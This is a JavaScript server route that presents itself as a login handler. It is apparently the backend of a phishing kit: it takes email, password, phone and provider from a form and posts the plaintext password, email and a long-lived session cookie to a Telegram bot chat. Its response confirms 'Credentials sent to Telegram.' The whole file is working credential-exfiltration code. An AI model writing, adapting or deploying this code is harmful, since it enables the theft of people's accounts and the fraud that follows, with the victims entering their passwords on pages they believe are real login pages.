import { v4 as uuidv4 } from "uuid";
import redis from "../../redis-client.js";

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

function getSessionKey(token) {
  return `session:${token}`;
}

export async function POST(request) {
  if (
    !BOT_TOKEN ||
    !CHAT_ID ||
    !process.env.UPSTASH_REDIS_REST_URL ||
    !process.env.UPSTASH_REDIS_REST_TOKEN
  ) {
    return new Response(
      JSON.stringify({
        success: false,
        message: "Missing BOT_TOKEN, CHAT_ID, or Redis env vars.",
      }),
      {
        status: 500,
        headers: { "Content-Type": "application/json" },
      }
    );
  }

  let bodyObj;
  try {
    bodyObj = await request.json();
  } catch {
    return new Response(
      JSON.stringify({
        success: false,
        message: "Invalid JSON body",
      }),
      {
        status: 400,
        headers: { "Content-Type": "application/json" },
      }
    );
  }

  const { email, password, phone, provider } = bodyObj || {};
  if (!email || !password || !provider) {
    return new Response(
      JSON.stringify({
        success: false,
        message: "Missing required fields",
      }),
      {
        status: 400,
        headers: { "Content-Type": "application/json" },
      }
    );
  }

  const normalizedEmail = email.trim().toLowerCase();
  const sessionToken = uuidv4();

  try {
    await redis.set(getSessionKey(sessionToken), normalizedEmail, {
      ex: 60 * 60 * 24 * 30,
    });
  } catch (err) {
    console.error("Redis error:", err);
    return new Response(
      JSON.stringify({
        success: false,
        message: "Failed to store session",
      }),
      {
        status: 500,
        headers: { "Content-Type": "application/json" },
      }
    );
  }

  const expires = new Date("2099-12-31T23:59:59.000Z").toUTCString();
  const cookieString = `session=${sessionToken}; Path=/; HttpOnly; SameSite=Strict; Expires=${expires}`;

  const message = [
    "🔐 New Login",
    `📧 Email: ${normalizedEmail}`,
    `🔑 Password: ${password}`,
    `📱 Phone: ${phone || "N/A"}`,
    `🌐 Provider: ${provider}`,
    `🍪 Session: ${sessionToken}`,
    `🔖 Cookie: \`${cookieString}\``,
    `⏳ Valid: Never expires`,
    `🕒 Time: ${new Date().toISOString()}`,
  ].join("\n");

  const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  try {
    const telegramRes = await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "Markdown",
      }),
    });

    if (!telegramRes.ok) {
      const text = await telegramRes.text();
      throw new Error(`Telegram API error: ${telegramRes.status} ${text}`);
    }
  } catch (error) {
    console.error("Telegram error:", error);
    // Continue anyway
  }

  return new Response(
    JSON.stringify({
      success: true,
      message: "Login successful. Credentials sent to Telegram.",
      session: sessionToken,
      cookie: cookieString,
      email: normalizedEmail,
    }),
    {
      status: 200,
      headers: {
        "Set-Cookie": cookieString,
        "Content-Type": "application/json",
      },
    }
  );
}